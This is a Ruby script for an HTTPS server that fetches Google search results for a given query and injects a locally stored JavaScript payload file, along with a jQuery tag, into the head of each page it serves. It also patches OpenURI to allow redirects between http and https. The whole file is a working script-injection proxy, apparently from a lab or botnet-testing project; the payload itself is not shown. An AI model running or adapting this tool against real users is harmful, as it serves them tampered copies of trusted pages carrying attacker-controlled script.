#!/usr/bin/env ruby

require 'rubygems'
require 'webrick'
require 'open-uri'
require 'net/http'
require 'webrick/https' 
require 'openssl'
require 'open-uri'
require 'nokogiri' 
require_relative("parser")

ArgPar = Parser.new

host, port, _cert_, _key_ = ArgPar.par()[0], ArgPar.par()[1], ArgPar.par()[2], ArgPar.par()[3] 
$host = host 
$port = port
$payload = File.read '/home/rt/botgoat/html/payload2.js'

module OpenURI
  class << self
    def redirectable?(uri1, uri2)
      a, b = uri1.scheme.downcase, uri2.scheme.downcase
      a == b || (a == 'http' && b == 'https')
      a == b || (a == 'https' && b == 'http')
    end
  end
end

class DigestContent < WEBrick::HTTPServlet::AbstractServlet

    def inject(content)
        edit = content.split("<head>")[1].split("</head>")[0].split("\n")
        second = edit.unshift($payload)
        sec = second.unshift('<script src="https://code.jquery.com/jquery-1.10.2.js"></script>')
        res = ""
        first = content.split("<head>")[0]
        third = content.split("<head>")[1].split("</head>")[1]
        renderedContent = ""
        res += first
        second.each do |referrer|
	  res += referrer + "\n"
        end
        res += third
        return res
      end

    def do_GET (request, response)
        if request.query["query"]
          queryStr = request.query["query"]
          url = "https://www.google.com/search?num=200&q="+queryStr
          begin
            res  = open(url) {|f| f.read }.to_str.encode(Encoding::UTF_8)
            #res = open() # Nokogiri::HTML(
          rescue
            res  = open(url) {|f| f.read }.to_str
            #res = Nokogiri::HTML(open("https://www.google.com/search?num=10&q="+queryStr))
          end
          #puts res
          response.content_type = "html" 
          response.body = self.inject(res)
       end
    end
end

cert = _cert_
pkey = _key_

server = WEBrick::HTTPServer.new(
	:host => $host,
	:Port => 443,
        :SSLEnable => true,
	:SSLCertificate => cert,
	:SSLPrivateKey => pkey
	)

server.mount "/moon/", DigestContent

trap("INT") {
    server.shutdown
}

server.start
